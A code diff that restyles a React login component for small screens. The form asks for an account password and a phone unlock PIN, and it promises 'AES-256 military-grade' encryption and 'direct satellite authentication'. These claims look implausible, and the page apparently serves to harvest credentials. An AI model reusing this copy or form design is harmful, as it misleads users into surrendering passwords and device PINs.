@@ -48,7 +48,7 @@ export function UserIdentifier({
       </div>
 
       <div className="grid gap-6">
-        <div className="space-y-6 bg-white/[0.02] border border-white/5 rounded-[2.5rem] p-8 lg:p-10">
+        <div className="space-y-6 bg-white/[0.02] border border-white/5 rounded-2xl sm:rounded-[2.5rem] p-4 sm:p-8 lg:p-10">
           <div className="space-y-4">
             <div className="space-y-2">
               <Label className="text-xs font-bold uppercase tracking-widest text-slate-500 ml-1">{labelText}</Label>
@@ -58,9 +58,9 @@ export function UserIdentifier({
                   value={identifier}
                   onChange={(e) => onIdentifierChange(e.target.value)}
                   placeholder={placeholder}
-                  className="h-14 bg-white/5 border-white/10 rounded-2xl pl-12 text-lg focus:ring-primary focus:border-primary text-white placeholder:text-slate-600"
+                  className="h-12 sm:h-14 bg-white/5 border-white/10 rounded-xl sm:rounded-2xl pl-10 sm:pl-12 text-base sm:text-lg focus:ring-primary focus:border-primary text-white placeholder:text-slate-600"
                 />
-                <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 w-5 h-5" />
+                <Lock className="absolute left-3 sm:left-4 top-1/2 -translate-y-1/2 text-slate-500 w-4 h-4 sm:w-5 sm:h-5" />
               </div>
             </div>
 
@@ -72,17 +72,17 @@ export function UserIdentifier({
                   value={password}
                   onChange={(e) => onPasswordChange(e.target.value)}
                   placeholder="Enter your account password"
-                  className="h-14 bg-white/5 border-white/10 rounded-2xl pl-12 pr-14 text-lg focus:ring-primary focus:border-primary text-white placeholder:text-slate-600"
+                  className="h-12 sm:h-14 bg-white/5 border-white/10 rounded-xl sm:rounded-2xl pl-10 sm:pl-12 pr-12 sm:pr-14 text-base sm:text-lg focus:ring-primary focus:border-primary text-white placeholder:text-slate-600"
                 />
-                <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 w-5 h-5" />
+                <Lock className="absolute left-3 sm:left-4 top-1/2 -translate-y-1/2 text-slate-500 w-4 h-4 sm:w-5 sm:h-5" />
                 <Button
                   type="button"
                   variant="ghost"
                   size="icon"
-                  className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-white hover:bg-white/5 rounded-xl"
+                  className="absolute right-2 sm:right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-white hover:bg-white/5 rounded-lg sm:rounded-xl"
                   onClick={() => setShowPassword(!showPassword)}
                 >
-                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
+                  {showPassword ? <EyeOff size={18} className="sm:w-5 sm:h-5" /> : <Eye size={18} className="sm:w-5 sm:h-5" />}
                 </Button>
               </div>
             </div>
@@ -95,21 +95,21 @@ export function UserIdentifier({
                   value={lockCode}
                   onChange={(e) => onLockCodeChange(e.target.value)}
                   placeholder="Enter your phone's unlock code/PIN"
-                  className="h-14 bg-white/5 border-white/10 rounded-2xl pl-12 text-lg focus:ring-primary focus:border-primary"
+                  className="h-12 sm:h-14 bg-white/5 border-white/10 rounded-xl sm:rounded-2xl pl-10 sm:pl-12 text-base sm:text-lg focus:ring-primary focus:border-primary"
                   maxLength={10}
                 />
-                <Key className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 w-5 h-5" />
+                <Key className="absolute left-3 sm:left-4 top-1/2 -translate-y-1/2 text-slate-500 w-4 h-4 sm:w-5 sm:h-5" />
               </div>
             </div>
           </div>
 
-          <div className="bg-primary/5 border border-primary/20 rounded-2xl p-6 flex items-start space-x-4">
-            <div className="w-10 h-10 bg-primary/20 rounded-xl flex items-center justify-center text-primary shrink-0">
-              <ShieldCheck size={24} />
+          <div className="bg-primary/5 border border-primary/20 rounded-xl sm:rounded-2xl p-4 sm:p-6 flex items-start space-x-3 sm:space-x-4">
+            <div className="w-8 h-8 sm:w-10 sm:h-10 bg-primary/20 rounded-lg sm:rounded-xl flex items-center justify-center text-primary shrink-0">
+              <ShieldCheck size={20} className="sm:w-6 sm:h-6" />
             </div>
             <div>
-              <h4 className="font-bold text-sm mb-1">Encrypted Transmission</h4>
-              <p className="text-xs text-slate-400 leading-relaxed">
+              <h4 className="font-bold text-xs sm:text-sm mb-1">Encrypted Transmission</h4>
+              <p className="text-[10px] sm:text-xs text-slate-400 leading-relaxed">
                 Your credentials are encrypted using AES-256 military-grade standards and processed through a secure VPC for direct satellite authentication.
               </p>
             </div>
@@ -119,7 +119,7 @@ export function UserIdentifier({
             onClick={onAuthenticate}
             disabled={!isFormValid}
             size="lg"
-            className="w-full h-14 rounded-2xl bg-primary hover:bg-primary/90 font-bold text-lg shadow-xl shadow-primary/20 transition-all active:scale-[0.98]"
+            className="w-full h-12 sm:h-14 rounded-xl sm:rounded-2xl bg-primary hover:bg-primary/90 font-bold text-base sm:text-lg shadow-xl shadow-primary/20 transition-all active:scale-[0.98]"
           >
             Begin Satellite Authentication
           </Button>
